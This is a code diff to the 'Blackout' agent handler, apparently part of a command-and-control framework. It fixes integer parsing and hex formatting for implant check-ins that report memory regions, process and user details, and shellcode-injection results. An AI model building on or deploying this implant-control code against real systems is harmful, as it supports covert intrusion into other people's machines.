@@ -422,10 +422,10 @@ class Blackout(AgentType):
                 self.console_message( AgentID, "Good", "Received Output:", Output )
 
             elif Command == BLACKOUT_CHECKIN:
-                bk_base   = response_parser.parse_int()
+                bk_base   = response_parser.parse_int64()
                 bk_len    = response_parser.parse_int()
                 bk_fullen = response_parser.parse_int()
-                bk_rxbase = response_parser.parse_int()
+                bk_rxbase = response_parser.parse_int64()
                 bk_rxsize = response_parser.parse_int()
                 
                 proc_name     = response_parser.parse_wstr()
@@ -434,7 +434,7 @@ class Blackout(AgentType):
                 proc_id       = response_parser.parse_int()
                 proc_par_id   = response_parser.parse_int()
                 protected     = response_parser.parse_int()
-                protected_status = "TRUE" if protected == 1 else "FALSE"
+                protected_status = "true" if protected == 1 else "false"
 
                 username      = response_parser.parse_str()
                 computername  = response_parser.parse_str()
@@ -449,10 +449,10 @@ class Blackout(AgentType):
 
                 Output = (
                     f"Blackout memory config:\n"
-                    f"\t=> Base Address: 0x{bk_base}\n"
+                    f"\t=> Base Address: 0x{bk_base:X}\n"
                     f"\t=> Length: {bk_len} | 0x{bk_len:X} bytes\n"
                     f"\t=> Full Length: {bk_fullen} | 0x{bk_fullen:X} bytes\n"
-                    f"\t=> RX Base Address: 0x{bk_rxbase}\n"
+                    f"\t=> RX Base Address: 0x{bk_rxbase:X}\n"
                     f"\t=> RX Size: {bk_rxsize} | 0x{bk_rxsize:X} bytes\n"
                     
                     f"\nProcess informations:\n"
@@ -478,14 +478,14 @@ class Blackout(AgentType):
                 self.console_message( AgentID, "Good", f"Received informations from agent:\n", Output )
 
             elif Command == COMMAND_MEMORY:
-                base_addr = response_parser.parser_int64()
+                base_addr = response_parser.parse_int64()
 
                 self.console_message( AgentID, "Good", f"Memory allocated with success at 0x{base_addr:X}", "" )
 
             elif Command == COMMAND_CLASSIC:
                 procid  = response_parser.parse_int()
                 ThreadId = response_parser.parse_int()
-                address = response_parser.parser_int64() 
+                address = response_parser.parse_int64() 
                 shellcode_size = response_parser.parse_int()
 
                 Output = f"\t- Process Id: {procid}\n\t- Address: {hex(address)} [{shellcode_size} bytes]\n\t- Thread Id: {ThreadId}"
